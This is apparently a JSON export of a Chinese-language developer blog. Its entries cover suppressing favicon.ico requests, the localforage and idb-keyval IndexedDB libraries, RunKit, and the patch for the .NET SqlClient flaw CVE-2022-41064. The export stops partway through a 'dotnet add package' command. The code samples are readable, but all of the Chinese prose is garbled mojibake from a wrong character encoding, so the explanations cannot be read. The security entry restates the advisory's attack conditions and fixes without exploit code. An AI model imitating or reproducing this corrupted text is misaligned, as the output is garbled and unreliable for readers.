[{"content":" åƒè€ƒç¶²ç«™\nå•é¡ŒåŸå›  ç€è¦½å™¨åˆåˆ°æ–°ç¶²ç«™æ™‚ï¼Œæœƒè©¦è‘—ä¸‹è¼‰åç‚º Favicon (Favorite Icon) çš„ç¶²ç«™ä»£è¡¨åœ–ç¤ºï¼Œç”¨åœ¨åœ°å€åˆ—ã€é ç±¤ã€æ›¸ç±¤(æˆ‘çš„æœ€æ„›)ä¸Šã€‚\nè‹¥ç¶²é æ²’ç‰¹åˆ¥æŒ‡å®šï¼Œç€è¦½å™¨é è¨­æœƒæŠ“å–ç¶²ç«™æ ¹è·¯å¾‘çš„ /favicon.ico æª”æ¡ˆï¼Œæ‰¾ä¸åˆ°å°±ç®—äº†ä¸æœƒè§¸ç™¼éŒ¯èª¤ã€‚\nä¸€èˆ¬æˆ‘å€‘ä¸ç‚ºæœƒç‚ºæ¸¬è©¦ã€é–‹ç™¼ç”¨ç¶²ç«™è¨­è¨ˆåœ–ç¤ºï¼Œä½†ç€è¦½å™¨ä»æœƒåœ¨ç¬¬ä¸€æ¬¡å­˜å–æ™‚å˜—è©¦ä¸‹è¼‰ /favicon.icoï¼Œä¸æ„å¤–åœ°ä»¥ HTTP 404 æ”¶å ´ï¼š\nåš´æ ¼ä¾†èªªï¼Œç€è¦½å™¨æœƒè¨˜ä½çµæœï¼Œ404 å¤±æ•—åªæœƒç™¼ç”Ÿä¸€æ¬¡(ç›´åˆ°ç€è¦½å™¨é‡å•Ÿ)ï¼Œå¤§å° 5KB èªªä¾†ç„¡å‚·å¤§é›…ã€‚ä½†å®ƒæœ€å›°æ“¾æˆ‘çš„åœ°æ–¹æ˜¯ä½¿ç”¨ F12 ç¶²è·¯å·¥å…·æˆ– Fidder æŠ“å°åŒ…æ™‚ï¼Œè§€å¯Ÿçµæœå¤©ä¸‹é£›ä¾†ä¸€ç­† /favicon.ico 404ï¼Œèªªæ˜æ™‚é‚„è¦é¡å¤–è§£é‡‹ï¼Œè »ç…©äººçš„ã€‚\nè§£æ±ºæ–¹å¼ çˆ¬æ–‡æŸ¥äº†é¿å…ç€è¦½å™¨æŠ“ /favicon.ico çš„æ–¹æ³•ï¼Œæœ‰ä»¥ä¸‹å¹¾ç¨®ï¼š\nFirefox 25+ ä¸æ”¯æ´ 1 \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; æœ‰äº›èˆŠç€è¦½å™¨ä¸æ”¯æ´ (Android Lollipop) 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;data:,\u0026#34;\u0026gt; è¨»ï¼šè‹¥æœ‰è¨­å®š Content-Security-Policy default-src \u0026lsquo;self\u0026rsquo; æœƒå°é™ data:image/png \u0026hellip; ä¾†æºï¼Œéœ€èª¿æ•´ç‚º default-src 'self' data: åƒè€ƒ 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;data:image/png;base64,iVBORw0KGgo=\u0026#34;\u0026gt; çµè«– çµè«–ï¼šè‹¥åªè€ƒæ…® Chromeï¼Œä¸‰ç¨®åšæ³•å‡å¯é¿å…ç€è¦½å™¨å˜—è©¦å­˜å– favicon.icoï¼Œç¬¬ä¸‰ç¨®åšæ³•æ¶µè“‹ç€è¦½å™¨æœ€å»£ã€‚\n","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52513251827_7a73de7710_o.png","permalink":"https://wayneblog.ga/2022-11-21/prevent-invalid-favicon/","title":"é¿å…ç„¡æ•ˆ favicon.ico å­˜å–å‹•ä½œ"},{"content":" åƒè€ƒç¶²ç«™\nlocalStorage æ˜¯å‰ç«¯æœ¬åœ°å„²å­˜çš„ä¸€ç¨®ï¼Œå…¶å®¹é‡ä¸€èˆ¬åœ¨ 5M-10M å·¦å³ï¼Œç”¨ä¾†å¿«å–ä¸€äº›ç°¡å–®çš„è³‡æ–™åŸºæœ¬å¤ ç”¨ï¼Œç•¢ç«Ÿå®šä½ä¹Ÿä¸æ˜¯å¤§è³‡æ–™é‡çš„å„²å­˜ã€‚\nåœ¨æŸäº›å ´æ™¯ä¸‹ localStorage çš„å®¹é‡å°±æœƒæœ‰é»æ‰è¥Ÿè¦‹è‚˜ï¼Œå…¶å¯¦ç€è¦½å™¨æ˜¯æœ‰æä¾›å¤§è³‡æ–™é‡çš„æœ¬åœ°å„²å­˜çš„å¦‚ IndexedDB å„²å­˜è³‡æ–™å¤§å°ä¸€èˆ¬åœ¨ 250M ä»¥ä¸Šã€‚\nå½Œè£œäº† localStorage å®¹é‡çš„ç¼ºé™·ï¼Œä½†æ˜¯ä½¿ç”¨è¦æ¯” localStorage è¤‡é›œä¸€äº› mdn IndexedDB\nä¸éå·²ç¶“æœ‰å¤§ä½¬é€ äº†è¼ªå­å°è£äº†ä¸€äº›å‘¼å«éç¨‹ä½¿å…¶ä½¿ç”¨ç›¸å°ç°¡å–®ï¼Œä¸‹é¢æˆ‘å€‘ä¸€èµ·ä¾†çœ‹ä¸€ä¸‹ï½\nlocalforage localforageï¼Œæ“æœ‰é¡ä¼¼ localStorage APIï¼Œå®ƒèƒ½å„²å­˜å¤šç¨®å‹åˆ¥çš„è³‡æ–™å¦‚ Arrayã€ArrayBufferã€Blobã€Numberã€Objectã€Stringï¼Œè€Œä¸åƒ…åƒ…æ˜¯å­—ä¸²ã€‚\né€™æ„å‘³è‘—æˆ‘å€‘å¯ä»¥ç›´æ¥å­˜ ç‰©ä»¶ã€é™£åˆ—å‹åˆ¥çš„è³‡æ–™é¿å…äº† JSON.stringify è½‰æ›è³‡æ–™çš„ä¸€äº›å•é¡Œã€‚\nå„²å­˜å…¶ä»–è³‡æ–™å‹åˆ¥æ™‚éœ€è¦è½‰æ›æˆä¸Šé‚Šå°æ‡‰çš„å‹åˆ¥ï¼Œæ¯”å¦‚ vue3 ä¸­ä½¿ç”¨ reactive å®šç¾©çš„è³‡æ–™éœ€è¦ä½¿ç”¨ toRaw è½‰æ›æˆåŸå§‹è³‡æ–™é€²è¡Œå„²å­˜ï¼Œ ref å‰‡ç›´æ¥å„²å­˜ xxx.value è³‡æ–™å³å¯ã€‚\nå®‰è£ ä¸‹è¼‰æœ€æ–°ç‰ˆæœ¬ æˆ–ä½¿ç”¨ npmã€bower é€²è¡Œå®‰è£ï¼Œå¼•å…¥ä¸‹è¼‰çš„ localforage å³å¯ä½¿ç”¨ã€‚\né€šé npm å®‰è£ï¼š 1 npm install localforage é€šé bower å®‰è£ï¼š 1 bower install localforage ä½¿ç”¨ æä¾›äº†èˆ‡ localStorage ç›¸åŒçš„apiï¼Œä¸åŒçš„æ˜¯å®ƒæ˜¯éåŒæ­¥çš„å‘¼å«è¿”å›ä¸€å€‹ Promise ç‰©ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 localforage.getItem(\u0026#39;somekey\u0026#39;) .then(function(value) { // ç•¶é›¢ç·šå€‰åº«ä¸­çš„å€¼è¢«è¼‰å…¥æ™‚ï¼Œæ­¤è™•ç¨‹å¼ç¢¼åŸ·è¡Œ console.log(value); }) .catch(function(err) { // ç•¶å‡ºéŒ¯æ™‚ï¼Œæ­¤è™•ç¨‹å¼ç¢¼åŸ·è¡Œ console.log(err); }); // callback ç‰ˆæœ¬ localforage.getItem(\u0026#39;somekey\u0026#39;, function(err, value) { // ç•¶é›¢ç·šå€‰åº«ä¸­çš„å€¼è¢«è¼‰å…¥æ™‚ï¼Œæ­¤è™•ç¨‹å¼ç¢¼åŸ·è¡Œ console.log(value); }); æä¾›çš„æ–¹æ³• getItemï¼š æ ¹æ“šè³‡æ–™çš„ key ç²å–è³‡æ–™ ä¸å­˜åœ¨å‰‡è¿”å› nullã€‚ setItemï¼š æ ¹æ“šè³‡æ–™çš„ key è¨­å®šè³‡æ–™(å„²å­˜ undefined æ™‚ getItem ç²å–æœƒè¿”å› null)ã€‚ removeItemï¼š æ ¹æ“š key åˆªé™¤è³‡æ–™ã€‚ lengthï¼š ç²å– key çš„æ•¸é‡ã€‚ keyï¼š æ ¹æ“š key çš„ç´¢å¼•ç²å–å…¶åã€‚ keysï¼š ç²å–è³‡æ–™å€‰åº«ä¸­æ‰€æœ‰çš„ keyã€‚ iterateï¼š è¿­ä»£è³‡æ–™å€‰åº«ä¸­çš„æ‰€æœ‰ value/key éµå€¼å°ã€‚ é…ç½® å®Œæ•´é…ç½®å¯æª¢è¦–æ–‡ä»¶\né€™è£¡èªªå€‹æˆ‘è¦ºå¾—å¾ˆæœ‰ç”¨çš„ï¼š\n1 localforage.config({ name: \u0026#39;My-localStorage\u0026#39; }); è¨­å®šå€‰åº«çš„åå­—ï¼Œä¸åŒçš„åå­—ä»£è¡¨ä¸åŒçš„å€‰åº«ï¼Œç•¶ä¸€å€‹æ‡‰ç”¨éœ€è¦å¤šå€‹æœ¬åœ°å€‰åº«éš”é›¢è³‡æ–™çš„æ™‚å€™å°±å¾ˆæœ‰ç”¨ã€‚\n1 2 3 4 5 6 const store = localforage.createInstance({ name: \u0026#34;nameHere\u0026#34; }); const otherStore = localforage.createInstance({ name: \u0026#34;otherName\u0026#34; }); // è¨­å®šæŸå€‹è³‡æ–™å€‰åº« key çš„å€¼ä¸æœƒå½±éŸ¿åˆ°å¦ä¸€å€‹æ•¸æ“šå€‰åº« store.setItem(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;); otherStore.setItem(\u0026#34;key\u0026#34;, \u0026#34;value2\u0026#34;); åŒæ™‚ä¹Ÿæ”¯æ´åˆªé™¤å€‰åº«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // å‘¼å«æ™‚ï¼Œè‹¥ä¸å‚³åƒï¼Œå°‡åˆªé™¤ç•¶å‰ä¾‹é …çš„ â€œè³‡æ–™å€‰åº«â€ã€‚ localforage.dropInstance() .then(function() { console.log(\u0026#39;Dropped the store of the current instance\u0026#39;); }); // å‘¼å«æ™‚ï¼Œè‹¥å¼•æ•¸ç‚ºä¸€å€‹æŒ‡å®šäº† name å’Œ storeName å±¬æ€§çš„ç‰©ä»¶ï¼Œæœƒåˆªé™¤æŒ‡å®šçš„ â€œè³‡æ–™å€‰åº«â€ã€‚ localforage.dropInstance({ name: \u0026#34;otherName\u0026#34;, storeName: \u0026#34;otherStore\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherStore\u0026#39;); }); // å‘¼å«æ™‚ï¼Œè‹¥å¼•æ•¸ç‚ºä¸€å€‹åƒ…æŒ‡å®šäº† name å±¬æ€§çš„ç‰©ä»¶ï¼Œå°‡åˆªé™¤æŒ‡å®šçš„ â€œè³‡æ–™åº«â€ (åŠå…¶æ‰€æœ‰è³‡æ–™å€‰åº«)ã€‚ localforage.dropInstance({ name: \u0026#34;otherName\u0026#34; }) .then(function() { console.log(\u0026#39;Dropped otherName database\u0026#39;); }); idb-keyval idb-keyval æ˜¯ç”¨ IndexedDB å¯¦ç¾çš„ä¸€å€‹è¶…ç´šç°¡å–®çš„åŸºæ–¼ promise çš„éµå€¼å„²å­˜ã€‚\nå®‰è£ 1 npm install idb-keyval ä½¿ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // å…¨éƒ¨å¼•å…¥ import idbKeyval from \u0026#39;idb-keyval\u0026#39;; idbKeyval.set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // æŒ‰éœ€å¼•å…¥æœƒ treeshake import { get, set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); ç€è¦½å™¨ç›´æ¥å¼•å…¥ï¼š\n1 \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/idb-keyval@6/dist/umd.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; æä¾›çš„æ–¹æ³• ç”±æ–¼å…¶æ²’æœ‰ä¸­æ–‡çš„å®˜ç¶²ï¼ŒæœƒæŠŠä¾‹å­åŠè‡ªå·±çš„ç†è§£é™„ä¸Šï¼š\nset setï¼š è¨­å®šè³‡æ–™\nkey å¯ä»¥æ˜¯ Numberã€Stringã€Date(IDB ä¹Ÿå…è¨±é€™äº›å€¼çš„é™£åˆ—ï¼Œä½† IE ä¸æ”¯æ´)ã€‚ value å¯ä»¥æ˜¯ Numberã€Arrayã€Objectã€Dateã€Blobs ç­‰ï¼Œå„˜ç®¡è€ Edge ä¸æ”¯æ´ nullã€‚\n1 2 3 4 5 import { set } from \u0026#39;idb-keyval\u0026#39;; set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); setMany setManyï¼š è¨­å®šå¤šå€‹æ•¸æ“š\nä¸€æ¬¡è¨­å®šå¤šå€‹å€¼ï¼Œæ¯”ä¸€å€‹ä¸€å€‹çš„è¨­å®šæ›´å¿«\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import { set, setMany } from \u0026#39;idb-keyval\u0026#39;; // ä¸æ‡‰è©²: Promise.all([set(123, 456), set(\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // é€™æ¨£åšæ›´å¿«: setMany([ [123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;], ]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); get getï¼š ç²å–è³‡æ–™\nå¦‚æœæ²’æœ‰ keyï¼Œé‚£éº¼ value å°‡è¿”å› undefinedã€‚\n1 2 3 4 5 import { get } from \u0026#39;idb-keyval\u0026#39;; // logs: \u0026#34;world\u0026#34; get(\u0026#39;hello\u0026#39;) .then((val) =\u0026gt; console.log(val)); getMany getManyï¼š ç²å–å¤šå€‹æ•¸æ“š\nä¸€æ¬¡ç²å–å¤šå€‹æ•¸æ“šï¼Œæ¯”ä¸€å€‹ä¸€å€‹çš„ç²å–è³‡æ–™æ›´å¿«\n1 2 3 4 5 6 7 8 9 import { get, getMany } from \u0026#39;idb-keyval\u0026#39;; // ä¸æ‡‰è©²: Promise.all([get(123), get(\u0026#39;hello\u0026#39;)]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); // é€™æ¨£åšæ›´å¿«: getMany([123, \u0026#39;hello\u0026#39;]) .then(([firstVal, secondVal]) =\u0026gt; console.log(firstVal, secondVal)); del delï¼š åˆªé™¤è³‡æ–™\næ ¹æ“š key åˆªé™¤è³‡æ–™\n1 2 3 import { del } from \u0026#39;idb-keyval\u0026#39;; del(\u0026#39;hello\u0026#39;); delMany delManyï¼š åˆªé™¤å¤šå€‹æ•¸æ“š\nä¸€æ¬¡åˆªé™¤å¤šå€‹éµï¼Œæ¯”ä¸€å€‹ä¸€å€‹çš„åˆªé™¤æ›´å¿«\n1 2 3 4 5 6 7 8 9 10 11 12 import { del, delMany } from \u0026#39;idb-keyval\u0026#39;; // ä¸æ‡‰è©²: Promise .all([del(123), del(\u0026#39;hello\u0026#39;)]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); // é€™æ¨£åšæ›´å¿«: delMany([123, \u0026#39;hello\u0026#39;]) .then(() =\u0026gt; console.log(\u0026#39;It worked!\u0026#39;)) .catch((err) =\u0026gt; console.log(\u0026#39;It failed!\u0026#39;, err)); update updateï¼š æ’éšŠæ›´æ–°è³‡æ–™ï¼Œé˜²æ­¢ç”±æ–¼éåŒæ­¥å°è‡´è³‡æ–™æ›´æ–°å•é¡Œ\nå› ç‚º get èˆ‡ set éƒ½æ˜¯éåŒæ­¥çš„ä½¿ç”¨ä»–å€‘ä¾†æ›´æ–°è³‡æ–™å¯èƒ½æœƒå­˜åœ¨å•é¡Œå¦‚ï¼š\n1 2 3 4 5 6 // Don\u0026#39;t do this: import { get, set } from \u0026#39;idb-keyval\u0026#39;; get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); get(\u0026#39;counter\u0026#39;).then((val) =\u0026gt; set(\u0026#39;counter\u0026#39;, (val || 0) + 1); ); // ä¸Šè¿°ç¨‹å¼ç¢¼æˆ‘å€‘æœŸæœ›çš„æ˜¯ 2 ä½†å¯¦éš›çµæœæ˜¯ 1ï¼Œæˆ‘å€‘å¯ä»¥åœ¨ç¬¬ä¸€å€‹ callback åŸ·è¡Œç¬¬äºŒæ¬¡æ“ä½œã€‚ æ›´å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨ update ä¾†æ›´æ–°è³‡æ–™ï¼š\n1 2 3 4 5 6 // Instead: import { update } from \u0026#39;idb-keyval\u0026#39;; update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); update(\u0026#39;counter\u0026#39;, (val) =\u0026gt; (val || 0) + 1); // å°‡è‡ªå‹•æ’éšŠæ›´æ–°ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡æ›´æ–°å°‡è¨ˆæ•¸å™¨è¨­å®šç‚º 1ï¼Œç¬¬äºŒæ¬¡æ›´æ–°å°‡å…¶è¨­å®šç‚º 2ã€‚ clear clearï¼š æ¸…é™¤æ‰€æœ‰è³‡æ–™\n1 2 3 import { clear } from \u0026#39;idb-keyval\u0026#39;; clear(); entries entriesï¼š è¿”å› [key, value] å½¢å¼çš„è³‡æ–™\n1 2 3 4 import { entries } from \u0026#39;idb-keyval\u0026#39;; // logs: [[123, 456], [\u0026#39;hello\u0026#39;, \u0026#39;world\u0026#39;]] entries().then((entries) =\u0026gt; console.log(entries)); keys keysï¼š ç²å–æ‰€æœ‰è³‡æ–™çš„ key\n1 2 3 4 import { keys } from \u0026#39;idb-keyval\u0026#39;; // logs: [123, \u0026#39;hello\u0026#39;] keys().then((keys) =\u0026gt; console.log(keys)); values valuesï¼š ç²å–æ‰€æœ‰è³‡æ–™çš„ value\n1 2 3 4 import { values } from \u0026#39;idb-keyval\u0026#39;; // logs: [456, \u0026#39;world\u0026#39;] values().then((values) =\u0026gt; console.log(values)); createStore createStoreï¼š è‡ªå®šç¾©å€‰åº«\n1 2 3 4 5 6 7 8 9 10 11 // è‡ªå®šç¾©è³‡æ–™åº«åç¨±åŠè¡¨åç¨± // å»ºç«‹ä¸€å€‹æ•¸æ“šåº«: // è³‡æ–™åº«åç¨±ç‚º tang_shiï¼Œè¡¨åç‚º table1 const tang_shi_table1 = idbKeyval.createStore(\u0026#39;tang_shi\u0026#39;, \u0026#39;table1\u0026#39;); // å‘å°æ‡‰å€‰åº«æ–°å¢è³‡æ–™ idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;table1 çš„è³‡æ–™\u0026#39;, tang_shi_table1); // é è¨­å»ºç«‹çš„å€‰åº«åç¨±ç‚º keyval-storeï¼Œè¡¨åç‚º keyval idbKeyval.set(\u0026#39;add\u0026#39;, \u0026#39;é è¨­çš„è³‡æ–™\u0026#39;); ä½¿ç”¨ createStore å»ºç«‹çš„è³‡æ–™åº«ä¸€å€‹åº«åªæœƒå»ºç«‹ä¸€å€‹è¡¨ï¼š\n1 2 3 4 5 6 7 // åŒä¸€å€‹åº«æœ‰ä¸å¯ä»¥æœ‰å…©å€‹è¡¨ï¼Œcustom-store-2 ä¸æœƒå»ºç«‹æˆåŠŸ: const customStore = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-name\u0026#39;); const customStore2 = createStore(\u0026#39;custom-db-name\u0026#39;, \u0026#39;custom-store-2\u0026#39;); // ä¸åŒçš„åº«æœ‰ç›¸åŒçš„è¡¨åï¼Œé€™æ˜¯å¯ä»¥çš„: const customStore3 = createStore(\u0026#39;db3\u0026#39;, \u0026#39;keyval\u0026#39;); const customStore4 = createStore(\u0026#39;db4\u0026#39;, \u0026#39;keyval\u0026#39;); ç¸½çµ æœ¬æ–‡ä»‹ç´¹äº†å…©å€‹ IndexedDB çš„åº«ï¼Œç”¨ä¾†è§£æ±º localStorage å„²å­˜å®¹é‡å¤ªå°çš„å•é¡Œã€‚\nlocalforage èˆ‡ idb-keyval ä¹‹é–“æˆ‘æ›´å–œæ­¡ localforage å› ç‚ºå…¶èˆ‡ localStorage ç›¸ä¼¼çš„ api å¹¾ä¹æ²’æœ‰ä¸Šæ‰‹æˆæœ¬ã€‚\nå¦‚æœéœ€è¦æ›´åŠ éˆæ´»çš„åº«å¯ä»¥çœ‹ä¸€ä¸‹ dexie.jsã€PouchDBã€idbã€JsStore æˆ–è€… lovefield ä¹‹é¡çš„åº«ã€‚\n","date":"2022-11-15T00:00:00Z","image":"https://live.staticflickr.com/65535/52501465120_8e19a1cda3_o.png","permalink":"https://wayneblog.ga/2022-11-15/localforage-and-idb-keyval/","title":"localStorage å®¹é‡å¤ªå°ï¼Ÿè©¦è©¦ localforageã€idb-keyval"},{"content":" åƒè€ƒç¶²ç«™\nè©¦ç”¨RunKit å…ˆä¾†èªªèªª RunKit æ˜¯ä»€éº¼ã€‚\né¦–å…ˆï¼ŒRunkit å¯ä»¥è®“ä½ åœ¨ç€è¦½å™¨ä¸­é‹è¡Œ Node.js çš„ä»£ç¢¼ã€‚åœ¨ Runkit ä¸­ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„èª¿ç”¨çœ¾å¤šçš„ npm æ¨¡å¡Šã€‚é€™å°±æœ‰é»åƒ Node.js ç‰ˆçš„ Jupyter Notebookã€‚åŒæ™‚ï¼ŒRunkit é‚„å¯ä»¥æä¾›ä¸€å€‹å…è²»çš„ HTTP æœå‹™å™¨è€Œç„¡éœ€ä»»ä½•çš„æœå‹™å™¨å®‰è£å’Œé…ç½®ã€‚é€™åœ¨é–‹ç™¼æ‰‹æ©Ÿ APP çš„æœå‹™å™¨ç«¯ï¼Œä»¥åŠå¾®æœå‹™çš„æ™‚å€™å°¤å…¶æœ‰ç”¨ã€‚ç•¶ç„¶ï¼Œå¯¦ç¾ç„¡æœå‹™å™¨çš„é¸æ“‡å¾ˆå¤šï¼Œæ¯”å¦‚ AWS çš„ Lambda + API Gatewayï¼Œä½† RunKit çš„æœ€å¤§å„ªå‹¢å°±æ˜¯å®Œå…¨å…è²»çš„ï¼Œé€™åœ¨é–‹ç™¼è»Ÿä»¶åŸå‹çš„æ™‚å€™å°±æ›´ç‚ºæ–¹ä¾¿äº†ã€‚\nä¸‹é¢åˆ†åˆ¥ä¾†çœ‹çœ‹é€™å…©é …åŠŸèƒ½ã€‚\næ‰“é–‹é é¢ï¼š https://runkit.com/home\nå¯ä»¥é€šé Github æˆæ¬Šç™»éŒ„ï¼š\nç™»éŒ„æˆåŠŸå¾Œå¯ä»¥çœ‹åˆ°ï¼š\né»æ“Šé‹è¡ŒæŒ‰éˆ•å¾Œå°±å¯ä»¥åœ¨é é¢ä¸­çœ‹åˆ°åŸ·è¡Œçµæœï¼š\nåœ¨ Runkit çš„é é¢ä¸­å¯ä»¥åƒæ­£å¸¸çš„ Node.js ç’°å¢ƒä¸€æ¨£é‹è¡Œå„ç¨® JS èªå¥ã€‚æ¯”å¦‚ï¼Œé‹è¡Œå¦‚ä¸‹çš„ç°¡å–®ä»£ç¢¼ç²å– Hive ä¸­æ–‡å€çš„æœ€æ–°æ–‡ç« ï¼š\n1 2 3 4 5 6 7 8 9 const hive = require(\u0026#39;@hiveio/hive-js\u0026#39;); // Read posts from Hive hive.api.getDiscussionsByCreated({ tag: \u0026#39;hive-105017\u0026#39;, limit: 10 }, function(err, discussions) { for (let i = 0; i \u0026lt; discussions.length; i++) { let post = discussions[i] console.log(post.title) } }) å¯ä»¥çœ‹åˆ°è¿”å›çš„ç»“æœï¼š\nAPI Endpoint å†ä¾†çœ‹çœ‹æˆ‘æœ€å–œæ­¡çš„ Runkit åŠŸèƒ½ï¼šæä¾›ç°¡å–®çš„ API endpointã€‚\néå¸¸ç°¡å–®çš„æºç¢¼ï¼š\n1 exports.endpoint = function(request, response) { response.end(\u0026#34;API endpoint test\u0026#34;); } å–®æ“Š publish é€²è¡Œç™¼å¸ƒï¼š\nç™¼å¸ƒå¾Œå–®æ“Š endpoint å°±æœƒæ‰“é–‹å°æ‡‰çš„ API URLï¼š\næ¯”å¦‚èªªï¼Œæˆ‘é€™è£¡çš„å°±æ˜¯ï¼š\nhttps://api-jdcmj9qsmxmb.runkit.sh/\nå¯ä»¥çœ‹åˆ°ï¼Œç„¡éœ€é…ç½®/é‹è¡Œæœå‹™å™¨ï¼Œå°±å¯ä»¥æœ‰è‡ªå·±çš„ API å¯ç”¨ï¼Œåˆæ˜¯ serverlessï¼ŒåŒæ™‚é‚„å…è²»ï¼Œæ˜¯ä¸æ˜¯å¾ˆçˆ½ï¼Ÿ\n","date":"2022-11-14T00:00:00Z","image":"https://live.staticflickr.com/65535/52498373077_445fbf68b7_o.jpg","permalink":"https://wayneblog.ga/2022-11-14/try-runkit/","title":"è©¦ç”¨ RunKit"},{"content":" åƒè€ƒç¶²ç«™\nå¾®è»Ÿåœ¨ 2022-11-08 å…¬ä½ˆäº† System.Data.SqlClientã€Microsoft.Data.SqlClient çš„å®‰å…¨æ¼æ´ï¼Œç”±æ–¼æ¶µè“‹å¤§é‡ .NET ç‰ˆæœ¬ (.NET Framework åˆ° .NET 6 éƒ½å¯èƒ½ä½¿ç”¨åˆ°)ï¼Œç¯„åœä¸å°ï¼Œèº«ç‚º .NET é–‹ç™¼äººå“¡ï¼Œæ‡‰è©²é—œæ³¨å…¶å½±éŸ¿åŠä¿®è£œæ–¹å¼ã€‚\nåƒè€ƒäº†ä»¥ä¸‹æ–‡ä»¶ï¼Œè©¦è‘—æ•´ç†è³‡è¨Šå¦‚å¾Œã€‚\nMicrosoft Security Advisory CVE 2022-41064 | .NET Information Disclosure Vulnerability #239 .NET Information Disclosure Vulnerability GHSA-8g2p-5pqh by GitHub .NET Framework Information Disclosure Vulnerability CVE-2022-41064 .NET Framework November 2022 Security and Quality Rollup Updates æ¼æ´ä¾†æºåŠæ”»æ“Šæ–¹å¼ æ¼æ´ç™¼ç”ŸåŸå› æ˜¯ç¾æœ‰ SQL Client ç¨‹å¼åº«æœ‰å€‹ Bugï¼Œåœ¨é«˜è² è¼‰ç‹€æ³ä¸‹ã€ŒéåŒæ­¥æŸ¥è©¢(Asynchronously Executed Query)ã€æœ‰å¯èƒ½ç™¼ç”ŸéŒ¯æ¥æŸ¥è©¢çµæœçš„ç‹€æ³ï¼Œäº¦å³æŸ¥è©¢ A æ‹¿åˆ°æŸ¥è©¢ B çš„çµæœã€‚\nè¨»ï¼šè³‡è¨Šæœ‰é™ï¼Œä½† Asynchronously Executed Query æ‡‰æŒ‡ ExecuteReaderAsyncã€ExecuteScalarAsyncã€ExecuteXmlReaderAsync ç­‰éåŒæ­¥æ–¹æ³•åƒè€ƒï¼ŒåŒæ­¥å¼æŸ¥è©¢(ExecuteReader()\u0026hellip;)åœ¨ä¸€äº›ç‹€æ…‹ä¸‹ä¹Ÿæœ‰å¯èƒ½å—å½±éŸ¿ã€‚(åœ¨ Github æ‰¾åˆ°ç›¸é—œå–®å…ƒæ¸¬è©¦ï¼Œé€é ExecuteReader() ä½†ä¸è®€å–å…§å®¹å°±æ‹‹æ£„ Transaction Scope æ–¹å¼é‡ç¾)\næ”»æ“ŠæˆåŠŸæ¢ä»¶ï¼šåƒè€ƒ\nExploiting this vulnerability requires an attacker to be within the SQL Connection Pool.\næ”»æ“Šè€…é ˆä½æ–¼åŒä¸€ SQL Connection Pool å…§ (æ›è¨€ä¹‹ï¼Œåœ¨åŒä¸€ Process å…§åŸ·è¡Œ) Successful exploitation of this vulnerability requires an attacker to exhaust all the threads in the thread pool.\næ”»æ“Šè€…éœ€è€—ç›¡æ‰€æœ‰ Thread Pool æ‰€æœ‰ Thread In this case, a successful attack could cause the attacker access queries from other users in the SQL Connection Pool.\nåœ¨æ­¤ç‹€æ³ä¸‹ï¼Œæ”»æ“Šè€…æœ‰æ©Ÿæœƒå­˜å–åˆ°åŒ SQL Connetion Pool å…¶ä»–ä½¿ç”¨è€…çš„æŸ¥è©¢çµæœ(æ’¿åˆ°ä»€éº¼å…§å®¹å±¬éš¨æ©Ÿæ€§è³ª) æ¼æ´ç¯„åœ æ¼æ´å­˜åœ¨ Microsoft.Data.SqlClient åŠ System.Data.SqlClient çœ¾å¤šç‰ˆæœ¬ï¼š\nMicrosoft.Data.SqlClient 1.1.3 (å«)ä¹‹å‰åŠ 2.0.0 ~ 2.1.1 System.Data.SqlClient 4.8.4 (å«)ä¹‹å‰ç‰ˆæœ¬ è€Œå¾®è»Ÿä¹Ÿå·²é‡‹å‡º 1.1.4ã€2.1.2ã€4.8.5 ä¿®è£œæ¼æ´\nä¿®è£œæ–¹å¼ .NET Core / .NET 5/6 ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ›´æ–°ç‰ˆæœ¬ï¼š\n1 2 3 4 5 6 7 dotnet add package Microsoft.Data.SqlClient --version 2.1.2 # æˆ– dotnet add package Microsoft.Data.SqlClient --version 